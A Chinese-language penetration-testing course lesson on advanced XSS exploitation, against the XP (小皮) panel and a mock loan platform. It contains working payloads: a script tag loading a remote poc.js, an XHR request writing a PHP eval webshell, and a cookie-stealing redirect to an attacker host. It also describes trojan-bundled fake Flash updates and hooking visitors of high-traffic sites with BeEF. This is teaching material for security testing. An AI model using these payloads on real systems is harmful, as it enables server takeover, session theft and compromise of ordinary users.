#  054：XSS平台搭建、漏洞复现与高级利用环境

![](img/8da8e0e1f87a1abc1033c7807feddf84_1.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_3.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_5.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_7.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_9.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_11.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_12.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_14.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_16.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_18.png)

在本节课中，我们将深入学习跨站脚本攻击的实战利用。课程将涵盖从基础的Cookie窃取，到结合后台数据包进行自动化攻击，再到利用钓鱼页面和高级攻击平台进行综合渗透。我们还会学习如何自主搭建XSS平台，以避免使用公共平台带来的风险。

![](img/8da8e0e1f87a1abc1033c7807feddf84_20.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_21.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_23.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_25.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_27.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_29.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_31.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_33.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_35.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_37.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_39.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_41.png)

## 🔍 回顾与问题定位

![](img/8da8e0e1f87a1abc1033c7807feddf84_43.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_45.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_47.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_49.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_51.png)

上一节课我们尝试利用小皮面板的XSS漏洞获取管理员Cookie，但实验未能成功。本节我们首先来分析失败的原因并找到解决方案。

![](img/8da8e0e1f87a1abc1033c7807feddf84_53.png)

实验失败并非因为XSS语句未执行，而是因为目标系统除了Cookie验证外，还使用了额外的令牌机制（如 `access_token`）。因此，仅获取Cookie不足以通过身份验证。

![](img/8da8e0e1f87a1abc1033c7807feddf84_55.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_57.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_59.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_61.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_63.png)

**核心问题**：`Cookie + Token` 双重验证机制。

![](img/8da8e0e1f87a1abc1033c7807feddf84_65.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_67.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_69.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_71.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_73.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_75.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_77.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_79.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_81.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_83.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_85.png)

## 🛠️ 进阶利用：JS代码写入后门

![](img/8da8e0e1f87a1abc1033c7807feddf84_87.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_89.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_91.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_92.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_94.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_96.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_98.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_100.png)

既然直接窃取Cookie行不通，我们需要转换思路。通过分析发现，目标后台存在文件编辑或计划任务添加功能。我们可以利用XSS执行JavaScript代码，模拟管理员操作，从而写入Webshell。

![](img/8da8e0e1f87a1abc1033c7807feddf84_102.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_104.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_105.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_107.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_109.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_110.png)

**攻击流程**：
1.  在本地搭建相同环境，分析后台关键操作（如写入文件）的数据包。
2.  将数据包转换为JavaScript代码，保存为 `poc.js` 文件。
3.  将 `poc.js` 托管在攻击者控制的服务器上。
4.  构造XSS载荷，让受害者的浏览器加载并执行远程的 `poc.js`。
5.  `poc.js` 执行后，会向目标网站目录写入一个后门文件（如 `1.php`）。

![](img/8da8e0e1f87a1abc1033c7807feddf84_112.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_114.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_116.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_118.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_120.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_121.png)

以下是模拟HTTP POST请求写入文件的JS代码核心逻辑：

![](img/8da8e0e1f87a1abc1033c7807feddf84_123.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_125.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_127.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_129.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_131.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_133.png)

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', '/admin/path/to/write_file.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('filename=1.php&content=<?php @eval($_POST["cmd"]);?>');
```

![](img/8da8e0e1f87a1abc1033c7807feddf84_134.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_135.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_137.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_139.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_141.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_143.png)

**关键点**：此方法成功的前提是，攻击者需要预先知晓后台特定功能的数据包结构。

![](img/8da8e0e1f87a1abc1033c7807feddf84_145.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_147.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_148.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_149.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_151.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_153.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_155.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_157.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_158.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_160.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_162.png)

## 🧪 实战复现一：小皮面板Getshell

![](img/8da8e0e1f87a1abc1033c7807feddf84_164.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_166.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_168.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_170.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_172.png)

接下来，我们复现针对小皮面板的完整攻击链。

![](img/8da8e0e1f87a1abc1033c7807feddf84_174.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_176.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_178.png)

**实验步骤**：
1.  **触发XSS**：在登录失败处插入XSS代码，例如 `<script src="http://攻击者IP/poc.js"></script>`。
2.  **管理员触发**：管理员登录后，查看包含XSS代码的错误日志。
3.  **代码执行**：管理员的浏览器加载并执行 `poc.js`。
4.  **写入后门**：`poc.js` 代码执行，在网站根目录（如 `/www/wwwroot/xxx/`）下生成 `1.php` 后门文件。
5.  **连接后门**：攻击者使用蚁剑或哥斯拉等工具连接 `http://目标站点/1.php`，成功获取服务器控制权。

![](img/8da8e0e1f87a1abc1033c7807feddf84_180.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_182.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_184.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_186.png)

> **注意**：实验过程中需确保文件路径正确，并注意目标系统的目录权限。

![](img/8da8e0e1f87a1abc1033c7807feddf84_188.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_190.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_192.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_194.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_196.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_198.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_200.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_202.png)

## 🎣 实战复现二：Cookie窃取与后台登录

![](img/8da8e0e1f87a1abc1033c7807feddf84_204.png)

我们以一款模拟的“贷款平台”为例，展示最经典的XSS利用：窃取Cookie并登录后台。

![](img/8da8e0e1f87a1abc1033c7807feddf84_206.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_208.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_210.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_212.png)

**漏洞点**：用户“结算账号”信息会在后台的“提现申请”列表中显示。

**攻击流程**：
1.  **插入载荷**：攻击者将自己的“结算账号”修改为XSS窃取Cookie的代码。
    ```html
    <script>document.location='http://攻击者平台/collect?cookie='+document.cookie</script>
    ```
2.  **申请提现**：攻击者提交提现申请。
3.  **管理员查看**：管理员在后台审核提现记录时，触发XSS代码。
4.  **Cookie回传**：管理员的Cookie被发送到攻击者的接收平台。
5.  **登录后台**：攻击者将接收到的Cookie替换到浏览器中，即可直接访问管理员后台，无需账号密码。

![](img/8da8e0e1f87a1abc1033c7807feddf84_214.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_216.png)

**技术要点**：这种“存储型XSS”利用的是用户输入在后台展示的环节，关键在于找到“管理员必然会查看”的数据点。

![](img/8da8e0e1f87a1abc1033c7807feddf84_218.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_220.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_222.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_224.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_226.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_228.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_230.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_231.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_233.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_235.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_237.png)

## 🎨 结合钓鱼的高级利用

![](img/8da8e0e1f87a1abc1033c7807feddf84_239.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_241.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_243.png)

XSS不仅可以窃取数据，还能与钓鱼攻击结合，诱导用户执行更危险的操作。

![](img/8da8e0e1f87a1abc1033c7807feddf84_245.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_247.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_249.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_251.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_253.png)

**场景**：伪造Flash更新页面。
1.  **制作钓鱼页**：克隆一个Flash播放器官方更新页面。
2.  **捆绑后门**：将木马程序与正常的Flash安装程序进行捆绑，并做免杀处理。
3.  **XSS引导**：通过XSS弹窗提示用户“Flash版本过低，请立即升级”。
4.  **用户中招**：用户点击更新后，下载并运行了捆绑木马的“安装程序”，攻击者电脑被控制。

![](img/8da8e0e1f87a1abc1033c7807feddf84_255.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_257.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_259.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_261.png)

**涉及的扩展技术**：
*   **网页克隆**：制作高仿钓鱼页面。
*   **程序捆绑**：将后门与正常软件结合。
*   **免杀处理**：绕过杀毒软件检测。

![](img/8da8e0e1f87a1abc1033c7807feddf84_263.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_265.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_267.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_269.png)

> 提示：网页克隆与木马捆绑技术在本系列课程的钓鱼专题（如第152、154天）中有详细讲解。

![](img/8da8e0e1f87a1abc1033c7807feddf84_271.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_273.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_275.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_277.png)

---

![](img/8da8e0e1f87a1abc1033c7807feddf84_279.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_281.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_283.png)

## 🏗️ 自主搭建XSS平台

![](img/8da8e0e1f87a1abc1033c7807feddf84_285.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_287.png)

依赖公共XSS平台存在风险（如特征被识别、不稳定）。因此，掌握自主搭建能力至关重要。

![](img/8da8e0e1f87a1abc1033c7807feddf84_289.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_291.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_293.png)

### 平台一：轻量型XSS平台

![](img/8da8e0e1f87a1abc1033c7807feddf84_295.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_297.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_299.png)

**特点**：部署简单，功能专注，适合基础利用。

![](img/8da8e0e1f87a1abc1033c7807feddf84_301.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_303.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_305.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_307.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_309.png)

**搭建步骤**：
1.  将源码放置于Web目录（如 `xss/`）。
2.  在PHPStudy等环境中，为该目录添加一个站点（如端口81）。
3.  访问 `http://IP:81` 进行安装，设置管理密码。
4.  登录后，创建新的“项目”，选择“默认模板”，填入平台接收地址，生成XSS载荷。

![](img/8da8e0e1f87a1abc1033c7807feddf84_311.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_313.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_315.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_317.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_318.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_320.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_322.png)

**使用**：将生成的载荷插入漏洞点，当受害者触发后，平台“控制面板”会收到Cookie、IP、User-Agent等信息。

### 平台二：BeEF（浏览器攻击框架）

![](img/8da8e0e1f87a1abc1033c7807feddf84_324.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_325.png)

**特点**：功能强大，可对受害者浏览器进行实时交互式控制。

![](img/8da8e0e1f87a1abc1033c7807feddf84_327.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_329.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_331.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_333.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_334.png)

**搭建步骤（Docker方式）**：
```bash
docker run -p 3000:3000 janes/beef
```
访问 `http://IP:3000/ui/panel`，默认账号密码为 `beef` / `beef`。

![](img/8da8e0e1f87a1abc1033c7807feddf84_336.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_338.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_340.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_342.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_344.png)

**核心功能演示**：
*   **浏览器劫持**：上线后，可命令受害者浏览器跳转到指定网址。
*   **社会工程学**：弹出伪造的Flash更新弹窗。
*   **信息收集**：获取浏览器插件、系统信息等。
*   **持久化**：尝试在浏览器中维持访问。

![](img/8da8e0e1f87a1abc1033c7807feddf84_346.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_348.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_350.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_352.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_354.png)

**高级利用思路**：将BeEF的Hook代码植入高流量网站（如个人博客），任何访问该站的用户浏览器都可能被“钓”上线，形成一种主动式攻击。

![](img/8da8e0e1f87a1abc1033c7807feddf84_356.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_358.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_360.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_362.png)

---

## 📚 课程总结

![](img/8da8e0e1f87a1abc1033c7807feddf84_364.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_366.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_368.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_370.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_372.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_374.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_375.png)

本节课我们一起深入探讨了XSS漏洞的多种高级利用方式：

![](img/8da8e0e1f87a1abc1033c7807feddf84_376.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_378.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_380.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_382.png)

1.  **思路转变**：从单纯窃取Cookie，发展到利用JS模拟后台操作写入后门。
2.  **经典复现**：通过“贷款平台”案例，完整演练了存储型XSS窃取Cookie并登录后台的流程。
3.  **组合攻击**：学习了XSS如何与钓鱼页面、软件捆绑、免杀技术结合，实现从Web到主机的突破。
4.  **环境搭建**：掌握了自主搭建轻量型XSS平台和功能强大的BeEF攻击框架，摆脱对公共平台的依赖。
5.  **主动利用**：了解了将攻击代码植入可信网站，进行主动式钓鱼的扩展思路。

![](img/8da8e0e1f87a1abc1033c7807feddf84_384.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_386.png)

XSS的危害远不止弹窗，它是一条通往服务器权限、用户凭证甚至内网渗透的潜在捷径。理解并实践这些利用方法，能帮助我们在渗透测试中更全面地评估风险，同时也提醒我们作为开发者，必须对用户输入进行严格的过滤和转义。

![](img/8da8e0e1f87a1abc1033c7807feddf84_388.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_390.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_392.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_394.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_396.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_398.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_400.png)

![](img/8da8e0e1f87a1abc1033c7807feddf84_402.png)

下节课，我们将探讨XSS的绕过技巧与防御方案。